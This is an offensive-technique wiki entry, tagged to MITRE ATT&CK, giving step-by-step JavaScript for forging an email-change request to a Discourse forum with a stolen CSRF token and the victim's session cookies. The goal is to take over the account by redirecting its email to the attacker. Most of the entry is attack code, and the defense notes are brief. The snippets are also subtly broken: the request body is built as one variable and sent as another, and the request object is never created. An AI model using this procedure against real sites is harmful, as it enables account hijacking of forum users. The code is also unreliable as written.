---
tags:
  - account-takeover
  - email-change
type: procedure
tools:
  - '[[tools/CloudFlare]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/xhr-open-post-email-change]]'
  - '[[commands/xhr-set-request-header-accept]]'
  - '[[commands/xhr-set-request-header-content-type]]'
  - '[[commands/xhr-with-credentials-true]]'
  - '[[commands/construct-email-change-body]]'
  - '[[commands/xhr-send-blob]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a2843528-7cb9-4cf7-a36b-374b6f601f53
created_at: '2025-12-13T09:00:34.481Z'
updated_at: '2025-12-13T09:00:34.481Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Change Victim Email Using Extracted CSRF

## Summary

This procedure crafts a JavaScript XMLHttpRequest to POST an email change request using the extracted CSRF token and username, achieving account takeover.

## Description

By submitting a forged request with the stolen CSRF token, the attacker bypasses protections and changes the victim's email to one under their control.

## Requirements

1. Extracted CSRF token and username
2. JavaScript execution environment
3. Victim's session active

## Defense

Defensive measures and detection strategies:

- Use strict CSRF validation and no-cache on auth routes
- Monitor for unauthorized email change attempts

## Objectives

1. Submit forged email change request
2. Initiate account takeover
3. Trigger verification email to attacker

## Instructions

### Step 1: Open XMLHttpRequest

**Context**: Initialize POST to email preferences endpoint.

**Command** ([[commands/xhr-open-post-email-change]]):
```javascript
xhr.open("POST", "https://discourse.instance.behind.cloudflare.proxy/users/" + user + "/preferences/email.json", true);
```

> Prepares the request URL.

### Step 2: Set Request Headers

**Context**: Set Accept and Content-Type headers.

**Command** ([[commands/xhr-set-request-header-accept]]):
```javascript
xhr.setRequestHeader("Accept", "text/html");
```

**Command** ([[commands/xhr-set-request-header-content-type]]):
```javascript
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
```

> Configures request format.

### Step 3: Enable Credentials

**Context**: Ensure cookies are sent.

**Command** ([[commands/xhr-with-credentials-true]]):
```javascript
xhr.withCredentials = true;
```

> Allows credential inclusion.

### Step 4: Construct Body

**Context**: Build form data with CSRF and new email.

**Command** ([[commands/construct-email-change-body]]):
```javascript
var body = "_method=PUT&email=" + encodeURIComponent(change_email_to) + "&authenticity_token=" + encodeURIComponent(csrf);
```

> Prepares payload.

### Step 5: Send Request

**Context**: Execute the request.

**Command** ([[commands/xhr-send-blob]]):
```javascript
xhr.send(new Blob([aBody]));
```

> Sends the email change request.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/xhr-open-post-email-change]]
- [[commands/xhr-set-request-header-accept]]
- [[commands/xhr-set-request-header-content-type]]
- [[commands/xhr-with-credentials-true]]
- [[commands/construct-email-change-body]]
- [[commands/xhr-send-blob]]

## Tools Used

- [[tools/CloudFlare]]

## Tags

- account-takeover
- email-change
